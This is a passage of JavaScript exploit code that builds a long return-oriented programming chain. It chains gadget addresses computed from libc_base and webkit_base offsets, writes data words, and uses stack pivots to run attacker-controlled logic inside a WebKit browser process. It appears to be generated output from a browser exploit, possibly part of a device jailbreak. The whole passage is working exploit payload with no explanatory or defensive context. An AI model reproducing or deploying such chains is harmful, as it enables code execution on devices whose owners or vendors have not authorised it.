]);
//L3018:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3016:
db([131072, 0]); // 0x20000
set_gadget(libc_base+788575,); //pop rax
//L3017:
db([131072, 0]); // 0x20000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+194216, //L3020
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194232, //L3021
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+194200, //L3019
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3019:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3020:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3021:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+194400, //L3022
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194416, //L3024
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194384, //L3023
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3023:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3022:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3024:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+194520, //L3028
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+194568, //L3029
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+194536, //L3026
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3028:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3026:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3027:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3029:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+194680, //L3030+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+194672, //L3030
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L3030:
db([0, 0]); // 0x0
set_gadgets([
ropchain+194696, //L3030+24
ropchain+194712, //L3025
libc_base+811575, //pop rsp
ropchain+194728, //L3031
//L3025:
libc_base+811575, //pop rsp
ropchain+199600, //L3032
//L3031:
libc_base+793877, //pop rsi
ropchain+194768, //L3033
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3033:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3034:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+194872, //L3036
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+194888, //L3037
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3036:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3037:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+195032, //L3041
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+195000, //L3039
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195016, //L3040
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3039:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3040:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3041:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+195104, //L3043
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3043:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+195160, //L3044
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3044:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+195240, //L3046
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3046:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3047:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+195344, //L3049
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195360, //L3050
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3049:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3050:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+195512, //L3052
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195544, //L3055
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195528, //L3053
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+195496, //L3054
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3054:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3052:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3053:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3055:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+195664, //L3057
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195680, //L3058
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+195648, //L3056
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3056:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3057:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3058:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+195768, //L3060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+195824, //L3061
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3061:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+195944, //L3063
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+195976, //L3065
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195960, //L3064
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3063:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3064:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+196136, //L3069
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+196104, //L3066
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+196088, //L3067
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3067:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3066:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3068:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3069:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+196192, //L3070
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3070:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+196296, //L3072
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196328, //L3074
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196312, //L3073
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3072:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3073:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3074:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196488, //L3078
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196456, //L3075
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+196440, //L3076
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3076:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3075:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3077:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+196544, //L3079
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+196648, //L3081
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+196680, //L3083
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196664, //L3082
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3081:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3082:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3083:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+196840, //L3087
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+196808, //L3084
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+196792, //L3085
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3085:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3084:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3086:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+196896, //L3088
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+197000, //L3090
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+197032, //L3092
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+197016, //L3091
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3090:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3091:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3092:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+197104, //L3093
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+197120, //L3094
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3093:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3094:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+197280, //L3098
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+197248, //L3095
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+197232, //L3096
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3096:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3095:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3097:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L3098:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+197336, //L3099
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L3099:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+197440, //L3101
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+197472, //L3103
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+197456, //L3102
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3101:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3102:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3103:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+197568, //L3105
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+197552, //L3104
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3104:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3105:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+197648, //L3106
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3106:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3107:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+197752, //L3109
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197768, //L3110
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3109:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+197912, //L3114
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+197880, //L3112
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197896, //L3113
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3112:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3113:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3114:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+197984, //L3116
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3116:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+198040, //L3117
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+198120, //L3119
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3119:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3120:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+198224, //L3122
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198240, //L3123
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3122:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+198392, //L3125
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+198424, //L3128
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198408, //L3126
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+198376, //L3127
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3127:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3125:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3126:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3128:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+198544, //L3130
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+198560, //L3131
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+198528, //L3129
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3129:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3130:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3131:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+198648, //L3133
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+198704, //L3134
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3134:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+198776, //L3137
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3137:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+198832, //L3139
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3139:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L3140:
libc_base+793877, //pop rsi
ropchain+198920, //L3141
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3141:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3142:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+199024, //L3144
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+199040, //L3145
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L3144:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3145:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+199192, //L3147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+199224, //L3150
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+199208, //L3148
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+199176, //L3149
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L3149:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L3147:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3148:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3150:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+199320, //L3152
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+199304, //L3151
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L3151:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L3152:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+199408, //L3154
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3153:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3154:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+199464, //L3155
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3155:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3156:
db([4294967276, 4294967295]); // -0x14
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+199544, //L3159
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L3159:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+193456, //L2999
//L3032:
libc_base+811575, //pop rsp
ropchain+209792, //L3160
//L2987:
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+199672, //L3162
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L3161:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L3162:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3163:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L3164:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L3166:
ropchain+199872, //L3165
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+220672, //L3167
//L3165:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+199944, //L3168
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L3168:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L3169:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L3172:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200064, //L3174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3173:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3174:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L3176:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200160, //L3178
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3177:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200232, //L3180
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L3179:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L3180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+865136, //mov [rax], cl
libc_base+793877, //pop rsi
ropchain+200304, //L3182
webkit_base+7438103, //mov [rsi], rax
